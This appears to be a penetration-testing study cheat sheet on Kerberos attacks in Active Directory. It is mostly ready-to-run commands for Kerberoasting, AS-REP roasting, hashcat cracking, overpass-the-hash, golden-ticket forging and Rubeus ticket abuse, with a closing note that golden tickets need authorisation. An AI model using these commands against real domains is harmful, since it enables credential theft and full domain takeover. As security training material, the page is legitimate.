---
tool: Kerberos attacks
slug: kerberos-attacks
kind: technique
stages: [actions-on-objectives]
category: Roasting, delegation and ticket abuse
platforms: [windows, network]
services: [kerberos, ldap]
ports: [88, 389, 464]
tags: [active-directory, kerberos, kerberoast, asrep, pass-the-ticket, delegation]
attack: [T1558.003, T1558.004, T1550.003]
summary: Turning Kerberos into credentials and access: roast service and pre-auth-less accounts for offline cracking, then reuse tickets to move and persist. The core of the AD domain phase.
references:
  - The Hacker Recipes: Kerberos | https://www.thehacker.recipes/ad/movement/kerberos/
  - Rubeus | https://github.com/GhostPack/Rubeus
---

## Kerberoasting (service accounts)

```bash
# Request service tickets, crack them offline (weak service-account passwords)
GetUserSPNs.py -request -dc-ip TARGET DOMAIN/jsmith:'Winter2026!'
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
```

## AS-REP roasting (no pre-auth)

```bash
# Accounts with "Do not require Kerberos preauthentication"
GetNPUsers.py -dc-ip TARGET DOMAIN/ -usersfile users.txt -no-pass
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

## Pass / overpass the hash, and tickets

```bash
# NTLM hash -> Kerberos TGT (overpass-the-hash), then use -k everywhere
getTGT.py DOMAIN/jsmith -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
export KRB5CCNAME=jsmith.ccache
netexec smb DC01 --use-kcache
# Build a golden ticket once you have the krbtgt hash (from secretsdump -just-dc)
ticketer.py -nthash <krbtgt_hash> -domain-sid <sid> -domain DOMAIN Administrator
```

## Windows, with Rubeus

```text
Rubeus.exe kerberoast /outfile:hashes.txt
Rubeus.exe asreproast /format:hashcat
Rubeus.exe ptt /ticket:<base64 or .kirbi>
```

## Notes

Roasting output must be cracked offline; NTLM hashes pass directly (see [Impacket](/cpts/#tool-impacket)). Golden/silver tickets and `krbtgt` extraction are high-impact and loud: only with explicit authorisation, and documented. Watch clock skew: Kerberos fails if your host and the DC differ by more than five minutes.
